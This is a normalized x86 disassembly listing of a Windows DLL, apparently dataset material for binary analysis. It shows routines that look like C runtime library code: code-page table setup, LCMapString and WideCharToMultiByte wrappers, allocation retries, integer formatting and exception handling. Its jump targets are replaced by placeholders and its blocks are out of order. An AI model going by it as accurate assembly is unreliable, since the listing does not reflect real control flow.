push [ esi ]
call sub_10028583
push esi
call sub_10024aba
add esp 0x10
xor esi esi
jmp r-xdata
pop edi
pop esi
pop ebp
retn
mov eax esi
jmp r-xdata
sub_10029579
push 0x14
push r--data
call sub_1002ca38
xor ebx ebx
mov [ ebp - 0x20 ] ebx
cmp [ ebp + 0x8 ] 0x5
jbe r-xdata
call sub_1002bd74
mov esi eax
mov [ ebp - 0x1c ] esi
call sub_10028858
or [ esi + 0x70 ] 0x10
mov [ ebp - 0x4 ] ebx
push 0x1
push 0xd8
call sub_1002a045
pop ecx
pop ecx
mov edi eax
mov [ ebp - 0x24 ] edi
cmp edi ebx
je r-xdata
call sub_1002972b
mov [ eax ] 0x16
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1002480c
add esp 0x14
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100296e4
mov eax [ ebp - 0x20 ]
push 0xc
call sub_1002d1b0
pop ecx
mov [ ebp - 0x4 ] 0x1
mov ecx [ esi + 0x6c ]
mov eax edi
call sub_100287f4
mov [ ebp - 0x4 ] ebx
call sub_100296a7
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx edi
call sub_10029269
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
call sub_1002ca7d
retn
push edi
call sub_1002875b
push edi
call sub_10028583
pop ecx
pop ecx
cmp [ ebp + 0xc ] ebx
je r-xdata
push 0xc
call sub_1002d1b0
pop ecx
mov [ ebp - 0x4 ] 0x2
lea ebx [ esi + 0x6c ]
mov eax ebx
call sub_1002881a
push edi
call sub_1002875b
pop ecx
test [ esi + 0x70 ] 0x2
jne r-xdata
push rw-data
push [ ebp + 0xc ]
call sub_100276a0
pop ecx
pop ecx
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_100296b3
jmp r-xdata
test [ rw-data ] 0x1
jne r-xdata
mov [ rw-data ] 0x1
mov edi [ ebx ]
mov eax rw-data
call sub_1002881a
push 0x18
mov eax [ rw-data ]
add eax 0xc
push eax
push rw-data
call sub_10026f10
add esp 0xc
call sub_100288ce
sub_100296e9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_10029751
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1002973e
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_100296e9
pop ecx
mov esi eax
call sub_1002972b
mov [ eax ] esi
pop esi
pop ebp
retn
sub_10029774
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x48 ] ebx
cmp [ esi + 0x14 ] ebx
je r-xdata
lea edi [ esi + 0xc0 ]
mov eax [ edi ]
cmp eax ebx
je r-xdata
lea eax [ esi + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ edi ] ebx
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc8 ] r--data
mov [ esi + 0xcc ] r--data
mov [ esi + 0xd0 ] r--data
mov [ esi + 0xac ] 0x1
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
push 0x4
call sub_1002a000
push 0x2
mov edi 0x180
push edi
mov [ ebp - 0x2c ] eax
call sub_1002a045
push 0x1
push edi
mov [ ebp - 0x1c ] eax
call sub_1002a045
push 0x1
push edi
mov [ ebp - 0x20 ] eax
call sub_1002a045
push 0x1
push 0x101
mov [ ebp - 0x28 ] eax
call sub_1002a045
add esp 0x24
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push eax
movzx eax [ esi + 0x30 ]
push 0x1004
push eax
lea eax [ ebp - 0x4c ]
push ebx
push eax
call sub_1002cea6
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x2c ]
call sub_10024aba
push [ ebp - 0x1c ]
call sub_10024aba
push [ ebp - 0x20 ]
call sub_10024aba
push [ ebp - 0x28 ]
call sub_10024aba
xor ebx ebx
add esp 0x10
inc ebx
jmp r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x24 ]
call sub_10024aba
pop ecx
mov eax ebx
jmp r-xdata
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] ebx
xor eax eax
mov ecx [ ebp - 0x24 ]
mov [ eax + ecx ] al
inc eax
cmp eax 0x100
jl r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x5
ja r-xdata
movzx eax [ ebp - 0x18 ]
cmp eax 0x1
mov [ ebp - 0x30 ] eax
jle r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push ebx
push [ esi + 0x4 ]
add eax 0x100
push eax
push 0x100
push [ ebp - 0x24 ]
mov [ ebp - 0x40 ] eax
push 0x1
push ebx
call sub_10034124
add esp 0x20
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
push ebx
push [ esi + 0x4 ]
mov edi 0xff
push edi
add ecx 0x81
push ecx
push edi
inc eax
push eax
push 0x100
push [ esi + 0x14 ]
push ebx
call sub_10029f92
add esp 0x24
test eax eax
je r-xdata
lea eax [ ebp - 0x11 ]
mov eax [ ebp - 0x28 ]
push ebx
push [ esi + 0x4 ]
add eax 0x81
push edi
push eax
mov eax [ ebp - 0x24 ]
push edi
inc eax
push eax
push 0x200
push [ esi + 0x14 ]
push ebx
call sub_10029f92
add esp 0x24
test eax eax
je r-xdata
movzx edi [ eax - 0x1 ]
movzx ecx cl
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
lea ecx [ eax + 0xfe ]
xor edx edx
cmp [ ebp - 0x30 ] 0x1
mov [ ecx ] dx
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x3c ] ecx
lea ecx [ edi + 0x80 ]
mov [ edi + 0x7f ] bl
mov [ edx + 0x7f ] bl
mov [ ecx ] bl
mov [ ebp - 0x44 ] ecx
lea ecx [ edx + 0x80 ]
mov [ ebp - 0x38 ] ecx
mov [ ecx ] bl
jle r-xdata
cmp edi ecx
jle r-xdata
push 0xfe
lea ecx [ eax + 0x200 ]
push ecx
push eax
call sub_10026f10
push 0x7f
lea eax [ edi + 0x100 ]
push eax
push edi
call sub_10026f10
mov eax [ ebp - 0x28 ]
push 0x7f
lea ecx [ eax + 0x100 ]
push ecx
push eax
call sub_10026f10
mov eax [ esi + 0xc0 ]
add esp 0x24
cmp eax ebx
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ edi + ecx ] 0x20
movzx ecx [ eax ]
inc edi
inc eax
inc eax
cmp [ eax - 0x1 ] bl
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] 0x1
mov [ esi + 0xc0 ] eax
mov eax [ ebp - 0x40 ]
mov [ esi + 0xc8 ] eax
mov eax [ ebp - 0x3c ]
mov [ esi + 0xc4 ] eax
mov eax [ ebp - 0x44 ]
mov [ esi + 0xcc ] eax
mov eax [ ebp - 0x38 ]
mov [ esi + 0xd0 ] eax
mov eax [ ebp - 0x30 ]
mov [ esi + 0xac ] eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x11 ]
mov [ ebp - 0x1c ] ecx
mov cl [ eax ]
cmp cl bl
je r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_10024aba
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_10024aba
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_10024aba
push [ esi + 0xc0 ]
call sub_10024aba
add esp 0x10
movzx ecx [ ecx - 0x1 ]
movzx edx dl
cmp ecx edx
mov [ ebp - 0x20 ] ecx
jg r-xdata
mov ecx [ ebp - 0x1c ]
inc ecx
inc ecx
mov [ ebp - 0x1c ] ecx
cmp [ ecx - 0x1 ] bl
jne r-xdata
lea ecx [ eax + ecx * 2 + 0x100 ]
jmp r-xdata
mov dl [ ecx ]
cmp dl bl
je r-xdata
inc [ ebp - 0x20 ]
mov edx 0x8000
mov [ ecx ] dx
inc ecx
inc ecx
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp - 0x1c ]
movzx ecx [ ecx ]
cmp [ ebp - 0x20 ] ecx
jle r-xdata
mov ecx [ ebp - 0x34 ]
sub_10029bcd
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_10024aba
pop ecx
sub_10029bed
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
xor ebx ebx
push edi
mov esi ecx
cmp [ rw-data ] ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jle r-xdata
push ebx
push ebx
xor edi edi
inc edi
push edi
push r--data
push 0x100
push ebx
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0x2
je r-xdata
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] edi
jmp r-xdata
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x14 ]
sub eax ecx
dec eax
cmp eax [ ebp + 0x14 ]
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
mov [ rw-data ] 0x2
cmp [ ebp + 0x20 ] ebx
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x8 ] eax
cmp eax 0x1
jne r-xdata
mov [ ebp + 0x14 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
push [ ebp + 0x8 ]
call sub_10034270
pop ecx
mov [ ebp - 0x14 ] eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
xor eax eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
cmp eax [ ebp + 0x20 ]
je r-xdata
lea esp [ ebp - 0x20 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_100242d7
leave
retn
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x24 ] ebx
push ebx
push ebx
push [ ebp + 0x14 ]
setne al
push [ ebp + 0x10 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x20 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x20 ] eax
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringA@IAT ]
mov esi eax
push ebx
push ebx
lea ecx [ ebp + 0x14 ]
push ecx
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x20 ]
call sub_100342b9
add esp 0x18
mov [ ebp - 0xc ] eax
cmp eax ebx
je r-xdata
jle r-xdata
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
push [ ebp - 0xc ]
call sub_10024aba
pop ecx
mov esi [ LCMapStringA@IAT ]
push ebx
push ebx
push [ ebp + 0x14 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
mov eax esi
cmp [ ebp + 0x18 ] eax
je r-xdata
jle r-xdata
xor esi esi
jmp r-xdata
push edi
push [ ebp - 0xc ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push 0x1
push [ ebp + 0x20 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push eax
call sub_10024aba
pop ecx
xor edi edi
cmp eax 0xffffffe0
ja r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
push [ ebp - 0xc ]
call sub_10029bcd
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov ecx eax
mov [ ebp - 0x8 ] ecx
cmp ecx ebx
je r-xdata
push eax
call sub_100272fd
pop ecx
cmp eax ebx
je r-xdata
call sub_10034470
mov eax esp
cmp eax ebx
je r-xdata
push [ ebp - 0x8 ]
push ebx
push edi
call sub_10024b80
add esp 0xc
push [ ebp - 0x8 ]
push edi
push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
add eax 0x8
cmp eax 0x400
ja r-xdata
test [ ebp + 0xc ] 0x400
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x18 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x14 ]
call sub_100342b9
mov esi eax
mov [ ebp - 0x10 ] esi
add esp 0x18
neg esi
sbb esi esi
and esi [ ebp - 0x8 ]
xor esi esi
jmp r-xdata
push eax
call sub_100272fd
pop ecx
cmp eax ebx
je r-xdata
call sub_10034470
mov edi esp
cmp edi ebx
je r-xdata
cmp ecx ebx
jle r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
push edi
call sub_10029bcd
pop ecx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
cmp ecx [ ebp + 0x1c ]
jg r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
push esi
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
push esi
call sub_10029bcd
pop ecx
push ebx
push ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
push eax
call sub_100272fd
pop ecx
cmp eax ebx
je r-xdata
call sub_10034470
mov esi esp
cmp esi ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
mov esi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ esi ] 0xcccc
add esi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push esi
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp esi ebx
je r-xdata
sub_10029f92
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10027728
push [ ebp + 0x28 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10029bed
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1002a000
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_100272fd
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_1002a045
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003449c
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_1002a091
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100345ba
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_1002a0df
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100347d5
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_1002a131
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
cmp [ ebp + 0x8 ] ebx
ja r-xdata
call sub_1002972b
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_1002480c
add esp 0x14
mov eax esi
jmp r-xdata
xor ecx ecx
cmp [ ebp + 0x10 ] ebx
mov [ esi ] bl
setne cl
inc ecx
cmp [ ebp + 0x8 ] ecx
ja r-xdata
call sub_1002972b
push 0x16
pop esi
pop ebx
leave
retn 0xc
mov ecx [ ebp + 0xc ]
add ecx 0xfffffffe
cmp ecx 0x22
ja r-xdata
call sub_1002972b
push 0x22
jmp r-xdata
pop edi
mov [ ebp - 0x4 ] ebx
mov ecx esi
cmp [ ebp + 0x10 ] ebx
je r-xdata
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_1002480c
add esp 0x14
mov eax esi
jmp r-xdata
mov edi ecx
mov [ esi ] 0x2d
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] 0x1
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x8 ]
jb r-xdata
mov edx [ ebp + 0x8 ]
cmp [ ebp - 0x4 ] edx
jb r-xdata
mov [ ecx ] dl
inc ecx
inc [ ebp - 0x4 ]
xor ebx ebx
cmp eax ebx
jbe r-xdata
mov [ ecx ] bl
dec ecx
mov [ esi ] bl
jmp r-xdata
xor edx edx
div [ ebp + 0xc ]
cmp edx 0x9
jbe r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
dec ecx
mov [ edi ] al
inc edi
cmp edi ecx
jb r-xdata
xor eax eax
sub_1002a20e
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x14 ]
test eax eax
jge r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
call sub_1002a131
pop ebp
retn
sub_1002a238
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
cmp edi ebx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jbe r-xdata
call sub_1002972b
push 0x16
xor eax eax
cmp [ ebp + 0x18 ] ebx
mov [ edi ] bl
setne al
inc eax
cmp [ ebp + 0x10 ] eax
ja r-xdata
pop esi
pop ebx
leave
retn 0x14
mov eax [ ebp + 0x14 ]
add eax 0xfffffffe
cmp eax 0x22
ja r-xdata
call sub_1002972b
push 0x22
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] ebx
mov esi edi
cmp [ ebp + 0x18 ] ebx
je r-xdata
pop esi
mov [ eax ] esi
mov [ ebp + 0x18 ] esi
mov [ ebp + 0xc ] ebx
neg edx
adc eax ebx
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
mov [ ebp - 0x4 ] 0x1
neg eax
add cl 0x30
add cl 0x57
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
jb r-xdata
test edx edx
jbe r-xdata
mov [ esi ] cl
mov ecx [ ebp - 0x4 ]
inc esi
inc ecx
mov [ ebp - 0x4 ] ecx
test eax eax
ja r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x14 ]
push eax
push edx
call sub_10034850
mov [ ebp - 0x8 ] ebx
mov ebx edx
mov edx eax
mov eax ebx
cmp ecx 0x9
jbe r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0x10 ]
jb r-xdata
mov [ esi ] 0x0
dec esi
mov [ edi ] 0x0
call sub_1002972b
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
xor ebx ebx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov dl [ eax ]
mov cl [ esi ]
mov [ esi ] dl
dec esi
mov [ eax ] cl
inc eax
mov [ ebp + 0x18 ] eax
cmp eax esi
jb r-xdata
xor eax eax
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1002480c
add esp 0x14
mov eax esi
jmp r-xdata
sub_1002a330
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002a238
pop edi
pop ebp
retn
sub_1002a34f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10027728
mov eax [ ebp + 0x18 ]
test eax eax
jle r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ LCMapStringW@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx eax
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub eax edx
dec eax
inc ecx
inc ecx
test edx edx
jne r-xdata
dec edx
cmp [ ecx ] 0x0
je r-xdata
or edx 0xffffffff
sub_1002a3a6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10027728
cmp [ ebp + 0x14 ] 0xffffffff
jge r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
xor eax eax
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_1002a3e4
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_100243ff
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1002a40d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100244cc
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1002a434
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea edx [ eax + 0x8 ]
cmp [ edx ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov ecx [ esi + 0x4 ]
cmp eax ecx
je r-xdata
test [ esi ] 0x2
je r-xdata
add ecx 0x8
push ecx
push edx
call sub_100276a0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
test al 0x1
je r-xdata
test [ edi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test al 0x2
je r-xdata
test [ edi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ edi ] 0x2
je r-xdata
sub_1002a493
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434f4d
je r-xdata
call sub_1002bd74
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn
call sub_1002bd74
add eax 0x90
dec [ eax ]
call sub_1002bd74
and [ eax + 0x90 ] 0x0
jmp sub_100316cd
sub_1002a4dc
push 0x10
push r--data
call sub_1002ca38
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
cmp [ edi + 0x4 ] 0x80
jg r-xdata
mov esi [ ebx + 0x8 ]
movsx esi [ ebx + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002a5a2
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_1002bd74
add eax 0x90
inc [ eax ]
and [ ebp - 0x4 ] 0x0
mov [ ebx + 0x8 ] esi
call sub_1002ca7d
retn
call sub_10031719
call sub_10031719
cmp esi [ edi + 0x4 ]
jl r-xdata
mov eax esi
shl eax 0x3
mov ecx [ edi + 0x8 ]
add ecx eax
mov esi [ ecx ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] 0x1
cmp [ ecx + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov [ ebx + 0x8 ] esi
push 0x103
push ebx
mov ecx [ edi + 0x8 ]
push [ ecx + eax + 0x4 ]
call sub_10031a00
mov [ ebp - 0x1c ] esi
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_1002a5bd
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx 0x19930520
je r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
cmp ecx 0x19930521
je r-xdata
call sub_1002bd74
xor ecx ecx
inc ecx
mov [ eax + 0x20c ] ecx
mov eax ecx
retn
cmp ecx 0x19930522
jne r-xdata
sub_1002a602
push 0x8
push r--data
call sub_1002ca38
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_1002ca7d
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_10027e4f
mov [ ebp - 0x4 ] 0xfffffffe
sub_1002a657
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ ecx ]
push esi
mov esi [ ebp + 0x8 ]
add eax esi
cmp [ ecx + 0x4 ] 0x0
jl r-xdata
pop esi
pop ebp
retn
mov edx [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov esi [ edx + esi ]
mov ecx [ esi + ecx ]
add ecx edx
add eax ecx
sub_1002a693
mov edi edi
push ebp
mov ebp esp
